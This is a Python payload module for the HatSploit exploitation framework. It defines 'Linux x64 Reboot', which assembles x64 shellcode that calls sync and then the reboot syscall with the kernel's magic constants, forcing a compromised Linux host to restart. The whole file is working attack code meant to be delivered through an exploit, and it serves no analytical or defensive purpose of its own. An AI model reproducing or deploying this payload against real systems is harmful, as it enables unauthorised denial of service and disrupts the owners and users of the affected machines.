"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler


class HatSploitPayload(Payload, Assembler):
    def __init__(self):
        super().__init__()

        self.details.update({
            'Name': "Linux x64 Reboot",
            'Payload': "linux/x64/reboot",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Reboot payload for Linux x64.",
            'Arch': ARCH_X64,
            'Platform': OS_LINUX,
            'Rank': "low",
            'Type': "one_side",
        })

    def run(self):
        return self.assemble(
            self.details['Arch'],
            """
            start:
                mov al, 0xa2
                syscall

                mov al, 0xa9
                mov edx, 0x1234567
                mov esi, 0x28121969
                mov edi, 0xfee1dead
                syscall
            """,
        )
